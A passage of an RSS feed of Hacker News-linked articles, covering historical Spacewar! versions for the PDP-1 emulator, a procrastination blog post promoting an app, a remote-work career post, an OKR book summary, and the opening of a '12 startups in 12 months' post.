		<li id="spacewar2b"><strong onclick="selectSpacewarModule('spacewar2b');" data-title="Click to select this program."><span></span>Spacewar! 2B</strong> <span>(2 Apr 1962)</span><br>This is the first complete version version of the game as presented at MIT's annual <em>Science Open House</em> in May 1962. Notably this is also the very version the background starfield (Peter Samson's <em>Expensive Planetarium</em>) was designed for, as this is annotated in the source code by <em>"stars by prs for s/w 2b"</em> and dated <em>"3/13/62, prs".</em> The program features the pre-particle-system "Crock Explosion" <a href="https://www.masswerk.at/spacewar/SpacewarOrigin.html#figure-5" target="SpacewarOrigin" title="Illustrative image in &quot;The Origin of Spacewar&quot; by J. M. Graetz" onclick="if (window.showEmbeddedImage) {return showEmbeddedImage('spacewar_origins/spacewar-fig5.jpeg', 417, 422);} else { return true;}">[4]</a> and optionally a faster movement of the starfield (sense switch 4), torpedoes are single shot only (no salvoes). Some of the differences are more cosmetical: The ships' exhaust flames are half the size of later versions, also the display of the starfield hasn't found its final form yet (starting at an other position as compared to later versions). Moreover, the original starfield routine, found here, is modulating the varying brightnesses of the stars by how often the individual stars are drawn, whereas later versions are using the built-in intensity levels of the <em>Type 30 CRT</em> display instead.<br>For more on the making-of of Spacewar! see <a href="https://www.masswerk.at/spacewar/SpacewarOrigin.html" target="SpacewarOrigin">"The Origin of Spacewar" by J. M. Graetz</a>.<br>
		<span></span>The code is run from a binary paper tape image (RIM) labeled "<a href="http://textfiles.com/bitsavers/bits/DEC/pdp1/papertapeImages/20031202/InsidePDP1_80s_box3/" target="_blank" title="&quot;spaceWar_SA-5.bin&quot; in &quot;InsidePDP1_80s_box3&quot; at textfiles.com">spaceWar_SA-5.bin</a>". This has been proven to be identical to loading the two paper tapes "<a href="http://textfiles.com/bitsavers/bits/DEC/pdp1/papertapeImages/20050823/" target="_blank" title="'spacewar2B_2apr62.bin' at textfiles.com">spacewar2B_2apr62.bin</a>" and "<a href="http://textfiles.com/bitsavers/bits/DEC/pdp1/papertapeImages/20031202/SteveRussell_box1/" target="_blank" title="'stars.bin' at textfiles.com">stars.bin</a>", both to be found at bitsavers.org.<br>
		(<em>"SA-5"</em> is not a version string, but indicates the program's start address being 5, which would start the program in a setup for reading the input from the console test switches rather than from MIT's special control boxes, as would be the case with the default start address. The label suggests that this was a tape sent from MIT to an other facility.)<br>
		Spacewar! 2B is known with a date as early as 25 March 1962. This earlier version shows minor differences regarding the polarity of the sense switch settings.<br>
		<img src="https://www.masswerk.at/spacewar/images/spacewar-minskytron-hyperspace.png" alt="Spacewar! — The Hyperspace Minskytron signature" title="The Minskytron signature effected by &quot;warp-induced photonic stress emission&quot;" width="75" height="105">
		<span></span>The program is presented here with two patches applied, namely the hyperspace-patch to include Martin Graetz's original hyperspace routine, the "<strong><a href="https://www.masswerk.at/spacewar/inside/insidespacewar-minskytron-hyperspace.html" target="_blank">Minskytron hyperspace</a></strong>" <a href="https://www.masswerk.at/spacewar/SpacewarOrigin.html#figure-4" target="_blank" title="Illustrative image in &quot;The Origin of Spacewar&quot; by J. M. Graetz" onclick="if (window.showEmbeddedImage) {return showEmbeddedImage('spacewar_origins/spacewar-fig4.jpeg', 419, 416);} else {return true;}">[5]</a> and its <em>"warp-induced photonic stress emission",</em> and the auto-restart patch for seemless playing. (There are exactly three jumps to hyperspace per player.)<br>
		This represents the the game as described and depicted in J.M. Graetz's seminal article <a href="https://www.masswerk.at/spacewar/SpacewarOrigin.html" target="SpacewarOrigin">"The Origin of Spacewar"</a> and as presented at the <em>MIT Science Open House</em> in May 1962. (It still lacks a scorer-patch, which seems to be lost.)
		The patches are provided by the paper tape images "<a href="http://textfiles.com/bitsavers/bits/DEC/pdp1/papertapeImages/20031202/InsidePDP1_80s_box3/" target="_blank">hyperspace85.bin</a>" <em>(Hyperspace VIci, 2 May 1962)</em> and  "<a href="http://textfiles.com/bitsavers/bits/DEC/pdp1/papertapeImages/20030408/" target="_blank">spaceWarRstrt.bin</a>" — an other tape provides the same patch as "<a href="http://textfiles.com/bitsavers/bits/DEC/pdp1/papertapeImages/20031202/InsidePDP1_80s_box3/" target="_blank">spacewAutoRestartPatch.bin</a>". (The auto-restart patch was to be applied to the hyperspace-patch and is by this officially a patch to a patch. Thus, loading the full program had become a fairly complex affair then, involving up to 6 tapes.)<br>
		<span></span>Listings of Spacewar! 2B and the patches may be found <a href="https://www.masswerk.at/spacewar/sources/" target="_blank">here</a>.<br>
		<span></span>Please mind that this is still the game early in development. The restart-patch is missing an edge case (pun in­tend­ed), where the ships would collide at the "antipode" in the corners of the display. The game requires a manual restart in this situation.</li>

		<li id="spacewar4.1f"><strong onclick="selectSpacewarModule('spacewar4.1f');" data-title="Click to select this program."><span></span>Spacewar! 4.1f</strong> <span>(20 Feb 1963; mod. for CHM 2005 – 2008)</span><br>This is the version apparently running at the <a href="http://www.computerhistory.org/" target="_blank">Computer History Museum</a> (CHM).<br>This is Spacewar! 4.1 modified by <strong>Peter Samson</strong> in 2005–2008 to include the <strong>scorer routine of Spacewar! 4.8</strong>. Moreover, version 4.1f features modified brightness settings for the background starfield (for use at the CHM), which are here remapped to usual values by the emulator. (Otherwise most of the stars would remain invisible.) Like other version of Spacewar! 4.x it requires the hardware multiply/divide option and features the single shot switch for torpedoes. The source code is dated <em>"spacewar 4.1  2/20/63 dfw"</em> and annotated <em>"mod for CHM, 2005-06-01 - 2005-11-28  --prs",</em> and <em>"changed delay in score display, 2008-08-22  --prs.".</em> The code is run from a binary paper tape image (<a href="http://textfiles.com/bitsavers/bits/DEC/pdp1/from_peter_samson/" target="_blank" title="Archive PDP-1 codes provided by Peter Samson at textfiles.com">sw41f.rim</a>) provided by Peter Samson via <a href="http://bitsavers.org/" target="_blank">bitsavers.org</a>.</li>

		<li id="spacewar4.2"><strong onclick="selectSpacewarModule('spacewar4.2a');" data-title="Click to select this program."><span></span>Spacewar! 4.2a (4.1/4.2 dfw)</strong> <span>(22 Feb 1963 ?)</span><br>This is an authentic representative of the 4.x-generation of Spacewar! (probably by "dfw", like version 4.1 above), requiring the hardware multiply/divide option of the PDP-1. Additionaly to some internal modifications it features, like all versions 4, a working single shot mode for torpedoes (sense switch 3). The code is run from a binary paper tape image (<a href="http://textfiles.com/bitsavers/bits/DEC/pdp1/papertapeImages/20040106/russell2/" target="_blank" title="Archive of Steve Russell's box #2 at textfiles.com">spacewar4.2a_sa4.bin</a>) provided by Steve Russell via <a href="http://bitsavers.org/" target="_blank">bitsavers.org</a>.<br>A visually distinctive detail of versions 4.x (4.1 and later) is the <em>"Sun"</em> (heavy star), now drawn by a dashed line like the rocket blasts, thus separating it visually a bit more from the starships (see the <a href="https://www.masswerk.at/spacewar/fullscreen.html#version=4.2a" title="Full-scale version of Spacewar! 4.2 emulated in HTML5/Javascript">high-res/full-scale version</a> for a close-up view.) Also, two ships colliding in free fall in the center will explode at the <em>"antipode"</em> rather than at the center as with earlier versions of the game.</li>

		<li id="spacewar4.3"><strong onclick="selectSpacewarModule('spacewar4.3');" data-title="Click to select this program."><span></span>Spacewar! 4.3</strong> <span>(17 May 1963)</span><br>This is a version by Monty Preonas (signing <em>"ddp"</em>), who also provided the adaptations for the automatic hardware multiply/divide option and the new gravity computations used by all flavors of Spacewar! 4 in his version 4.0 <em>(2 Feb 1962)</em> earlier.<br>
		Spacewar! 4.3 features, like Monty Preonas' flavor of version 4.2 and version 4.4 (also signed <em>"ddp",</em> but presumably by Joe Morris), a special <strong>on-screen score display</strong>, very much like the one of the 4.8-scorer-patch (see the note on scores below). Like all versions by Monty Preonas, it usues an implementation of the background starfield alike the one of Spacewar! 2B.<br>
		The game features a special <strong>Twin Star mode</strong> to be engaged by sense-switch 2 (accessible by the <em>options menu</em> <img src="https://www.masswerk.at/spacewar/images/menubutton_small.png" width="20" height="16" alt="options menu icon" title="options menu icon"> at the top right corner of the screen). This visually distorted mode puts the <em>Needle</em> in the center of the screen in between a doubled sun and draws any other objects relatively to this ship. Moreover, some items are drawn at a double offset and torpedoes are displaced for real, resulting in a quite vexing game play. This mode was probably initially intended as an <em>ego view</em> from the <em>Needle's</em> perspective and left <em>as-is</em> as an amazing novelty. (Compare "Spacewar! 2015" below.)<br>
		<span></span>The program, dated <em>"5/17/63",</em> was newly assembled from source code provided in the assorted listings available at <a href="http://www.computerhistory.org/collections/catalog/102664173" target="_blank" title="'Stars by prs for s/w 2b', CHM, catalog no. 102664173">CHM catalog no. 102664173</a> (which apparently came from Joe Morris, compare <cite><a href="https://groups.google.com/d/msg/alt.sys.pdp10/cNG89mmlbK0/V0JPyn3Mg7sJ" target="_blank">Joe Morris, alt.sys.pdp10, Jannuary 6, 2005</a></cite>).</li>

		<li id="spacewar4.8"><strong onclick="selectSpacewarModule('spacewar4.8');" data-title="Click to select this program."><span></span>Spacewar! 4.8</strong> <span>(24 Jul 1963)</span><br>Apparently the final version of MIT-Spacewar!, dated <em>"7/24/63"</em> and signed <em>"dfw"</em>. A patch for a special <strong>on-screen scorer</strong> is available for this version (see the note on scoring below).<br>
		The game was newly assembled including the dedicated scorer patch. Sources <em>("spacewar4.8part1_engl.txt", "spacewar4.8part2_engl.txt", and "spacewar4.8_scorer.txt")</em> are available at <a href="http://textfiles.com/bitsavers/bits/DEC/pdp1/papertapeImages/20040817/" target="_blank" title="Spacewar 4.8! sources and sorer-patch at textfiles.com">textfiles.com</a> and <a href="http://bitsavers.org/" target="_blank">bitsavers.org</a>.</li>

		<li id="spacewar4.1hafb"><strong onclick="selectSpacewarModule('spacewar4.1hafb');" data-title="Click to select this program."><span></span>Spacewar! 4.1 Holloman Air Force Base Version</strong><br>This is a reconstruction of a version of PDP-1 Spacewar! as seen at the Holloman Air Force Base (New Mexico) and described by John W. Andrews in December 1966 for "The Gamesman" (<a href="https://archive.org/details/The_Gamesman_4-1967-12/page/n31" target="_blank" title="Archived copy of The Gamesman, issue 4, Dec. 1967 (archive.org)">The Gamesman, Issue 4, Dec 1967, pp 30-32</a>). Altered starting positions are probably the most interesting feature of this version. (Controls have been swapped accordingly to accommodate for this.)<br>
		<span></span><img src="https://www.masswerk.at/spacewar/images/holloman-afb-spacewar.png" alt="Starting positions in Holloman Air Force Base Spacewar." width="338" height="339" onclick="showEmbeddedImage('images/holloman-afb-spacewar_solid.png', 338, 339);return false;">These are the changes as applied …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.masswerk.at/spacewar/">https://www.masswerk.at/spacewar/</a></em></p>]]>
            </description>
            <link>https://www.masswerk.at/spacewar/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25195214</guid>
            <pubDate>Tue, 24 Nov 2020 04:14:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Can your boss know you're procrastinating?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25194970">thread link</a>) | @zoozla
<br/>
November 23, 2020 | https://blog.elifiner.com/your-boss-knows-youre-procrastinating/ | <a href="https://web.archive.org/web/*/https://blog.elifiner.com/your-boss-knows-youre-procrastinating/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-250">
	<!-- .entry-header -->

	
	
	<div>
		
<p>Hey, you. Yeah, you. With the pajamas. I know you haven’t washed them in a few weeks, I can feel the smell from all the way in Canada. And I get it. Because I’m wearing my pajamas right now and I haven’t washed them in a while either. We’re all in this together, so lets parse this out a little bit.</p>



<p>When the pandemic hit and we all got permission to work from home, you were probably extatic. “This is awesome,” you thought, “PAJAMAS!” But it’s not that simple. Without the energy of the office environment it’s kinda hard to get into the groove. And yes, the modern open floor plan isn’t ideal for focused work and we used to gripe about that, but not seeing anyone for weeks on end gets old quickly.</p>



<p>When no one is watching, it’s way to easy to check out Hacker News or Twitter or Reddit for a little while and then go down a rabbit hole of understanding how exactly how those mRNA vaccines work or what’s the latest projected layout of Starship is. Hours, days, sometimes weeks go by like that.</p>



<p>Without the discipline annoyingly imposed by the office environment, we’re left to our own devices, our own discipline and we often find it lacking. Instead of making actual progress on our work, we submit vague progress reports and list the problems we encounter all the while building up shame, guilt and fear.</p>



<p>Emotions are a funny thing though, especially negative emotions. We don’t like ’em. And we’d do anything to not feel them. So when the guilt, shame and that quiet terror of being found out come up, we want to run away. And what’s a better refuge than the conveniently endless feeds on social media (not to mention the autoplaying Youtube videos)?</p>



<p>But wait a sec, didn’t we just say that the guilt <em>started</em> with procrastination? Is it also causing it? Oh, now we’re in deep. Real deep.</p>



<p>I don’t know if your boss actually knows you’ve been <s>lying</s> massaging the truth. She’s likely in the same boat, fighting the same demons, too preoccupied with her own procrastination to notice yours. But <em>you</em> know, and so do your pajamas. This positive feedback loop between negative emotions and procrastination is only going to get worse – unless you do something.</p>



<p>The problem with emotions is that we only know two ways to deal with them – express them or supress them (by distracting ourselves). And neither gets us the result we are looking for, which is breaking out of the cycle.</p>



<p>Luckily, there’s a third option, not commonly taught and not well understood outside of postmodern new age circles. Emotions can be <em>released</em>. Releasing emotions isn’t about expressing them, talking about them or thinking about them. It’s about allowing ourselves to feel them, fully, staying with the unpleasantness for as long as neccessary. And letting them evaporate. It’s as natural as taking a shit, but unfortunately we’ve been taught to keep emotions bottled up (especially the men among us). Imagine eating without ever taking a dump. Yeah, that’s what holding on to emotions feels like.</p>



<p>The easiest way to release emotions is to ask yourself a simple question:</p>



<p><em>Could you allow yourself to feel this fear/anger/guilt?</em></p>



<p>Contemplate this question. Don’t try to derive an answer, the answer itself isn’t important. Let the question bounce around inside your head for a little while. You may feel something starting to shift.</p>



<p>For some of you, perhaps those who’ve had experience with meditation or therapy, this should be enough. Others need a lot more guidance.</p>



<p>That’s why I build <a href="https://wuju.app/">Wuju</a>, an app that can help you process and <em>release</em> emotions. My stats of around 2000 people show it can drop the intensity of any negative emotion by up to 90% within a few minutes. If you’re stuck in a procrastination loop, it might be worth a try.</p>



<p>(Wuju is subscription based, but you can try it for as long as you need to see if it works for you.)</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://blog.elifiner.com/your-boss-knows-youre-procrastinating/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25194970</guid>
            <pubDate>Tue, 24 Nov 2020 03:27:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Could Your Job Become Permanently Remote?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25194924">thread link</a>) | @dearJulius
<br/>
November 23, 2020 | https://career.dearjulius.com/2020/11/could-your-job-become-permanently-remote.html | <a href="https://web.archive.org/web/*/https://career.dearjulius.com/2020/11/could-your-job-become-permanently-remote.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-4023444617386077093" itemprop="articleBody">

<div>
<p>
Could your work be permanently remote? Here are some pieces of information that can help you determine this!
</p>

</div>

<div><p><img alt="Could Your Job Become Permanently Remote?" data-original-height="653" data-original-width="1024" src="https://1.bp.blogspot.com/-e-NTanoE24Y/X7xyeA0AbXI/AAAAAAAAGAo/9uJnza7BXsMfcWs_T2prm5Z0X_c8LC-5ACLcBGAsYHQ/s16000/remote-work.jpg" title="Remote Work">
</p>
<br>
<div><p>By <b>Ashley Campbell</b></p><div><p>2020 has seen many of our jobs completely change. The coronavirus and </p><u><a href="https://www.who.int/emergencies/diseases/novel-coronavirus-2019" target="_blank">Covid-19 pandemic</a></u><p> has wrought havoc with businesses operating in all sorts of industries. In order to comply with government guidelines and restrictions, many businesses have now had to switch to having their staff work on a remote basis, as they are unable to have everyone operating with a two meters distance between them at all times in office spaces and other commercial premises. In some ways, this is great. Working from home is seen as desirable and preferable by many employees. It cuts out expensive and time consuming commutes that have proven bad for employee health. It cuts out rushed lunch breaks with low quality packed lunches, as staff can prepare their lunch at home in their own kitchens. It also proves beneficial for the business in terms of profit margins, as it cuts out the costs and overheads associated with renting commercial property. But is remote work here to stay and could your job become permanently remote? Here are a few pieces of information that could help you determine this!</p></div><h3>Ask Your Employer Their Intentions</h3><div><p>The easiest and most trustworthy way to determine whether your job is going to become permanently remote is to </p><u><a href="https://www.careeraddict.com/talk-to-boss#:~:text=When%20you%20are%20talking%20to,and%20lean%20into%20the%20conversation." target="_blank">ask your employer</a></u><p> yourself. If they have a plan, they may be able to provide you with a straightforward yes or no answer to your question, which will allow you to prepare yourself for the change, or - if you are unhappy with the change - you can start seeking employment elsewhere. Nobody other than your employer will have a 100% certain answer as to whether your position will remain remote or not.</p></div><h3>Look at What Other Companies Are Doing</h3><div><p>If you notice that many competitor companies or similar companies in your field or industry are switching to operating on a permanently remote basis, chances are your company could be heading in a similar direction. Watching developments will give you a good indication of what the general trend in your field is. For example, </p><u><a href="https://precisionlabtesting.com/2020/09/25/blood-testing-for-traveling-physicians/" target="_blank">This Company</a></u><p> has developed blood tests that doctors can carry out outside of clinics, meaning that the trend towards staying home rather than venturing out seems to be continuing, even in the field of healthcare itself.</p></div><h3>Consider Whether It Is Benefiting Your Company</h3><p>If remote work is benefiting your company, chances are it’s here to stay. If the company is generating the same sales and profits, but has fewer outgoings due to remote work cutting rent and overhead costs, chances are the owners and managers will be content with things continuing this way. If the company is constantly facing security threats, data breaches and other issues, it’s likely they will be working to get back on site as soon as possible.</p><p>Remote work suits some people. It doesn’t suit others. Either way, you’re going to want to know whether you’ll be continuing to work remotely or not. Hopefully, some of the above advice will help you to get some answers!</p></div></div>



</div></div>]]>
            </description>
            <link>https://career.dearjulius.com/2020/11/could-your-job-become-permanently-remote.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25194924</guid>
            <pubDate>Tue, 24 Nov 2020 03:20:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Summary of Measure What Matters (OKR Framework)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25194576">thread link</a>) | @productceo
<br/>
November 23, 2020 | https://www.product.ceo/measure-what-matters/ | <a href="https://web.archive.org/web/*/https://www.product.ceo/measure-what-matters/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                
                <h3 id="john-doerr-portfolio-penguin-">John Doerr (Portfolio Penguin)</h3><p>Objectives and Key Results (OKR) framework is widely used in the technology industry for setting objectives and tracking progress. The OKR framework earned its fame after Google in its infancy has adopted the method to brings its projects into order. In Measure What Matters, John Doerr, the man who brought the framework to Google, explains the OKR framework.</p><h2 id="history-of-okr-and-its-predecessors">History of OKR and Its Predecessors</h2><ul><li>Scientific Management (Taylor-Ford Model): Frederick Winslow Taylor and Henry Ford were the first to measure output systematically and analyze how to get more of it. They held that the most efficient and profitable organization was authoritarian.</li><li>Management by Objectives (MBO): Peter Drucker believed Taylor-Ford Model is not fit for knowledge work. Drucker wrote that a corporation should be a community built on trust and respect for the workers, not just a profit machine. He urged subordinates be consulted on company goals.</li><li>HP Way and iMBO: HP and Intel adopted Peter Drucker’s MBO and called it, respectively, HP Way and iMBO (Intel MBO). iMBO, by Andy Grove, amended MBO by tracking key performance indicators.</li><li>Objectives and Key Results (OKR): John Doerr learnt iMBO from Andy Grove, renamed it to OKR, and applied it to his portfolio companies at KPCB, including Google.</li></ul><h2 id="what-okr-is-and-what-okr-is-for">What OKR is and What OKR is for</h2><ul><li>OKR is “a management methodology that helps to ensure that the company focuses efforts on the same important issues throughout the organization”.</li><li>OKRs give visibility into an organization and a productive way to push back.</li><li>OKR is meant to be shared with all other employees in the organization. The lowest ranking contributor can see everybody else’s OKRs up to the CEO (and more importantly, horizontally in other teams).</li><li>Once set, progress in regard to OKRs should be checked at least once a quarter. Google checks once a month.</li><li>OKR is flexible. It is not meant to be a financial commitment or a weapon against an employee in their performance review. If this is not clarified, teams will resort to unambitious OKRs or waste time looking for the perfect OKRs.</li><li>At any point in cycle, for any Os or KRs, the team can perform any of four operations:</li><li>Continue: If team is on track and goal is not broken, then don’t fix it.</li><li>Update: Circumstance has changed and OKR needs to be revised consequently. This includes schedule and priorities.</li><li>Start: Launch a new OKR mid-cycle whenever the need arises.</li><li>Stop: When a goal has outlived its usefulness, drop it.</li><li>John Doerr sets OKRs quarterly, and starts brainstorming Q2 OKRs midway through Q1.</li></ul><h2 id="how-to-set-objectives-and-key-results">How to Set Objectives and Key Results </h2><ul><li>An objective is what is to be achieved. Objectives are significant, concrete, action oriented, and inspirational. They’re a vaccine against fuzzy thinking and fuzzy execution.</li><li>Key results benchmark and monitor how we get to the objective. Effective KRs are specific and time-bound, aggressive yet realistic. They are measurable and verifiable. You either meet a key result’s requirements or you don’t; there is no gray area.</li><li>Objectives are compared to principle and vision. Key results are compared to practice and execution.</li><li>Less is more. There should be only three to five objectives per cycle, and each objective should be tied to three to five key results only.</li><li>“All key results are completed” must be equivalent to “objective is achieved”.</li><li>Non-Numeric KRs are allowed: Marissa Mayer reportedly said, “It’s not a key result unless it has a number”, but John Doerr’s definition of KR, or the best practice examples from KPCB portfolio companies, Intel, and Google, have key results that are not numeric. However, John Doerr’s definition of KR and best practice examples from KPCB portfolio companies, Intel, and Google, allow KRs that are binary achievements (e.g. “Release X” or “Complete Migration”), and I believe adopting that flexible definition of KRs will make it easier for us (Bing MM) to ensure that “achieving every KR” is equivalent to “achieving the associated O”.</li></ul><h2 id="setting-ambitious-okrs">Setting Ambitious OKRs</h2><ul><li>Goals should be challenging.</li><li>Edwin Locke, a psychology professor at University of Maryland who influenced Andy Grove, published that hard goals drive performance more effectively than easy goals, and specific hard goals produce a higher level of output than vaguely worded ones.</li><li>If you are certain you are going to nail a key result, you’re not pushing yourself hard enough. “OKRs are big, not incremental. We don’t expect to hit all of them. If we do, we’re not setting them aggressively enough.” (Google OKR Playbook).</li><li>“You are not supposed to strive for greens on every OKR you write. . . It took courage to write an OKR that might fail, but there was no other way if we wanted to be great.” (Sundar Pichai).</li></ul><h2 id="setting-okrs-up-and-down-in-the-organiation">Setting OKRs Up and Down in the Organiation</h2><ul><li>Top Down and Bottom Up</li><li>Set goals from the bottom up. To promote engagement, teams and individuals should be encouraged to create at least half of their own OKRs, in consultation with managers. When all objectives are set top down, motivation is corroded.</li><li>An optimal OKR frees contributors to set some of their objectives and most or all of their key results.</li><li>Some, but not all, key results at a level become objectives at the level below. (Note that key results, not objectives, become objectives of the level below).</li><li>When all objectives are cascaded, the process can degrade into a mechanical, color-by-numbers exercise. Tightly cascading organizations tend to resist fast and frequent goal setting. Even minor updates can burden downstream. Tight cascading locks in vertical alignment, but is not effective in connecting peers horizontally.</li><li>Remind, a KPCB portfolio company, involves team members in voting on their quarter’s top objectives in order to ensure that OKRs are not just top down.</li></ul><h2 id="best-practice-examples">Best Practice Examples</h2><h3 id="example-an-okr-that-john-doerr-actually-used-when-he-was-at-intel">Example: An OKR that John Doerr actually used when he was at Intel</h3><p>Objective: Demonstrate the 8080’s superior performance as compared to the Motorola 6800.</p><p>Key Results: (as measured by)</p><ol><li>Deliver five benchmarks.</li><li>Develop a demo.</li><li>Develop sales training materials for the field force.</li><li>Call on three customers to prove the material works.</li></ol><h3 id="example-operation-crush-by-andy-grove-at-intel">Example: Operation Crush by Andy Grove at Intel</h3><p>Intel Corporate Objective: Establish the 8086 as the highest performance 16-bit microprocessor family, as measured by:</p><p>Key Results: (Q2 1980)</p><ol><li>Develop and publish five benchmarks showing superior 8086 family performance (Applications).</li><li>Repackage the entire 8086 family of products (Marketing).</li><li>Get the 8MHz part into production (Engineering, Manufacturing).</li><li>Sample the arithmetic coprocessor no later than June 15 (Engineering).</li></ol><p>Engineering Department Objective: Deliver 500 8MHz 8086 parts to CGW by May 30.</p><p>Key Results: (as measured by)</p><ol><li>Develop final art to photo plot by April 5.</li><li>Deliver Rev 2.3 masks to fab on April 9.</li><li>Test tapes completed by May 15.</li><li>Fab red ta start no later than May 1.</li></ol><h3 id="example-hypothetical-sports-team-by-john-doerr-to-illustrate-cross-level-okrs">Example: Hypothetical Sports Team by John Doerr to Illustrate Cross-Level OKRs</h3><p>Head Coach (Level Above) Objective: Win Super Bowl.</p><p>Key Results: (as measured by)</p><ol><li>Passing attack amasses 300+ yards per game.</li><li>Defense allows fewer than 17 points per game.</li><li>Special teams unit ranks in top 3 in punt return coverage.</li></ol><p>Offensive Coach (Level Below): Objective: Generate 300-yards-per-game-passing-attack.</p><p>Key Results: (as measured by)</p><ol><li>Achieve 65% pass completion rate.</li><li>Cut interceptions to fewer than 1 per game.</li><li>Hire new quarterbacks coach.</li></ol><p>Defensive Coach (Level Below): Objective: Give up fewer than 17 points a game.</p><p>Key Results: (as measured by)</p><ol><li>Allow fewer than 100 rushing yards per game.</li><li>Increase number of sacks to 3+ per game.</li><li>Develop a Pro Bowl cornerback.</li></ol><p>Special Teams Coach (Level Below): Objective: Improve on top 3 ranking for punt coverage team.</p><p>Key Results: (as measured by)</p><ol><li>Allow fewer than 10 yards per punt return.</li><li>Block 4+ punts over the season.</li></ol><h3 id="example-intuit">Example: Intuit</h3><p>Objective: Modernize, rationalize, and secure the technology used to run the business of Intuit.</p><p>Key Results: (as measured by)</p><ol><li>Complete the migration of Oracle eBusiness Suite to R12 and retire 11.5.9 this quarter.</li><li>Deliver wholesale billing as a platform capability by end of FY16.</li><li>Complete onboarding of agents in small business unit to Salesforce.</li><li>Create a retirement plan for all legacy technology.</li><li>Draft and get alignment on new Workforce Technology strategies, roadmaps, and principles.</li></ol><h3 id="example-google-youtube">Example: Google YouTube</h3><p>Objective: Reach 1 billion hours of watch time per day [by 2016] with growth driven by:</p><p>Key Results: (as measured by)</p><ol><li>Search team + Main App (+XX%), Living Room (+XX%)</li><li>Grow engagement and gaming watch time (X watch hours per day)</li><li>Launch YouTube VR experience and grow VR catalog from X to Y videos.</li></ol>
              </div></div>]]>
            </description>
            <link>https://www.product.ceo/measure-what-matters/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25194576</guid>
            <pubDate>Tue, 24 Nov 2020 02:21:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Let's Go the 12 Startups in 12 Months Challenge Starts Now]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25194509">thread link</a>) | @rajatvijay
<br/>
November 23, 2020 | https://monicalent.com/12x-startup/ | <a href="https://web.archive.org/web/*/https://monicalent.com/12x-startup/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

          <article>

              

              
              <figure>
                  <img src="https://monicalent.com/images/blog/banff-canada.jpg" alt="Let's go! The 12 Startups in 12 Months Challenge Starts Now">
              </figure>
              

              <section>
                  <div>
                      

<p>What would you do if I gave you $1 million today on the condition that you invest it entirely in the stock market?</p>

<p>First off, you’d probably find someone who knows way more about investing and get some
professional advice.</p>

<p>But in lieu of that, you’d divide your money among a variety of bets:</p>

<p>Stable companies with a history of profitability, growth-stage companies with a high tolerance
for risk, and maybe a few companies you just personally believe have
potential.</p>

<p>In short, you’d diversify.</p>

<p>The thought of putting all $1 million into a single company <em>probably</em> wouldn’t cross your mind.</p>

<p>Someday soon, I’d like to think a year of my time will be “worth” more than $1
million. So I won’t be putting it all into a single company either.</p>

<p>Instead I’ll build a startup a month for the next year.</p>

<h2 id="prior-art">Prior Art</h2>

<p>The first person to popularize building <a href="https://levels.io/12-startups-12-months/" alt="12 startups in 12 months (opens in a new tab)" target="_blank">12 startups in 12 months</a>
 is Pieter Levels, who
launched products like NomadList and RemoteOK in 2014.</p>

<p>Since he operates both as <a href="https://nomadlist.com/open" alt="open (opens in a new tab)" target="_blank">open</a>
 <a href="https://remoteok.io/open" alt="startups (opens in a new tab)" target="_blank">startups</a>
 we know they make a combined $600,000 per year.</p>

<p>Not bad for a solo founder with a part-time sys admin.</p>

<p>In the 5 years since, several others have taken the same challenge.</p>

<p>Jon Yongfook <a href="https://blog.yongfook.com/12-startups-in-12-months.html" alt="started (opens in a new tab)" target="_blank">started</a>

at the end of 2018, and eventually founded BannerBear. In the year he’s been
working on it, it’s grown to <a href="https://www.indiehackers.com/product/mojosaas" alt="$5.1K MRR (opens in a new tab)" target="_blank">$5.1K MRR</a>
 (monthly recurring revenue).</p>

<p>When I was chatting with Dominic Monn about the idea, he told me he’s had success with this approach too:</p>

<blockquote>
<p>I did something along the same lines where I launched 6 things in about 6 months in 2018 and <a href="https://mentorcruise.com/" alt="two (opens in a new tab)" target="_blank">two</a>
 <a href="https://remoteml.com/" alt="things (opens in a new tab)" target="_blank">things</a>
 grew out of it that make around $3.5k MRR together today, and some of the others I sold for a cumulative 5 figures as well.</p>
</blockquote>

<p>The common thread is that no one doing the challenge completes it.</p>

<p>Building 12 startups isn’t actually the goal.</p>

<p>The goal is to eliminate the most common blockers from shipping a product:
failure to stick to an MVP and finish something, fear of shipping, launching, charging money, and so forth.</p>

<p>Now, each of these things has to happen inside a month.</p>

<p><strong>The idea is that a fixed timespan helps you <em>quickly</em> find a few ideas worthy of your undivided focus.</strong></p>

<p>Instead of spending years working on an idea that won’t pan out.</p>

<p>I’m under no illusion that since Pieter’s very public success, a ton of people
have undergone the same challenge.</p>

<p>Few, if any, have seen the same financial outcomes thus far. The majority still work their
day jobs. And a quick search on Google reveals that most people don’t make it past the
first 2-3 startups.</p>

<p>That’s why I’ve adapted the challenge to tip the odds in my favor.</p>

<h2 id="it-s-dangerous-to-go-alone">It’s dangerous to go alone</h2>

<p>In <em><a href="https://www.goodreads.com/book/show/36291655-lost-and-founder" target="_blank">Lost and Founder</a></em>, Rand Fishkin, former CEO of Moz, writes:</p>

<blockquote>
<p>That’s one of the biggest things I’ve learned about startups: it’s dangerous to go alone. You want people around you who’ve been through this before and are willing to openly share their experiences.</p>
</blockquote>

<p>This is the main difference in our approach to building
12 startups in 12 months: We’re not going alone.</p>

